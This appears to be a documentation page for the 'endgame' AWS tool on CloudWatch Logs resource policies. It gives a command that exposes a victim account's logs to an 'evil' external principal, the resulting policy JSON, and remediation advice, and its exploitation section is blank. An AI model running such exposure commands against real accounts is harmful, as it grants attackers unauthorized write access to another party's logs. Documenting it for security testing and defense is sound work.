# CloudWatch Logs Resource Policies

CloudWatch Resource Policies allow other AWS services or IAM Principals to put log events into the account.

* [Steps to Reproduce](#steps-to-reproduce)
* [Exploitation](#exploitation)
* [Remediation](#remediation)
* [References](#references)

## Steps to Reproduce

* To expose the resource using `endgame`, run the following from the victim account:

```bash
export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil

endgame expose --service cloudwatch --name test-resource-exposure
```

* To view the contents of the exposed resource policy, run the following:

```bash
aws logs describe-resource-policies
```

* Observe that the contents of the exposed resource policy match the example shown below.

## Example

```json
{
    "resourcePolicies": [
        {
            "policyName": "test-resource-exposure",
            "policyDocument": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Sid\":\"\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::999988887777:root\"},\"Action\":[\"logs:PutLogEventsBatch\",\"logs:PutLogEvents\",\"logs:CreateLogStream\"],\"Resource\":\"arn:aws:logs:*\"}]}",
            "lastUpdatedTime": 1613244111319
        }
    ]
}
```

## Exploitation

```
TODO
```

## Remediation

> ‼️ **Note**: At the time of this writing, AWS Access Analyzer does **NOT** support auditing of this resource type to prevent resource exposure. **We kindly suggest to the AWS Team that they support all resources that can be attacked using this tool**. 😊

* **Trusted Accounts Only**: Ensure that CloudWatch Logs access is only shared with trusted accounts, and that the trusted accounts truly need access to write to the CloudWatch Logs.
* **Ensure access is necessary**: For any trusted accounts that do have access, ensure that the access is absolutely necessary.
* **Restrict access to IAM permissions that could lead to exposing write access to your CloudWatch Logs**: Tightly control access to the following IAM actions:
      - [logs:PutResourcePolicy](https://docs.aws.amazon.com/AmazonCloudWatchLogs/latest/APIReference/API_PutResourcePolicy.html): _Creates or updates a resource policy allowing other AWS services to put log events to this account_
      - [logs:DeleteResourcePolicy](https://docs.aws.amazon.com/AmazonCloudWatchLogs/latest/APIReference/API_DeleteResourcePolicy.html): _Deletes a resource policy from this account. This revokes the access of the identities in that policy to put log events to this account._
      - [logs:DescribeResourcePolicies](https://docs.aws.amazon.com/AmazonCloudWatchLogs/latest/APIReference/API_DescribeResourcePolicies.html): _Lists the resource policies in this account._

Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaining/#cloudsplaining) to identify violations of least privilege in IAM policies. This can help limit the IAM principals that have access to the actions that could perform Resource Exposure activities. See the example report [here](https://opensource.salesforce.com/cloudsplaining/)

## References

* [CloudWatch Logs Resource Policies](https://docs.aws.amazon.com/AmazonCloudWatch/latest/logs/iam-access-control-overview-cwl.html)
* [API Documentation: PutResourcePolicy](https://docs.aws.amazon.com/AmazonCloudWatchLogs/latest/APIReference/API_PutResourcePolicy.html)
* [aws logs put-resource-policy](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/logs/put-resource-policy.html)
* [aws logs describe-resource-policy](https://docs.aws.amazon.com/cli/latest/reference/logs/describe-resource-policies.html)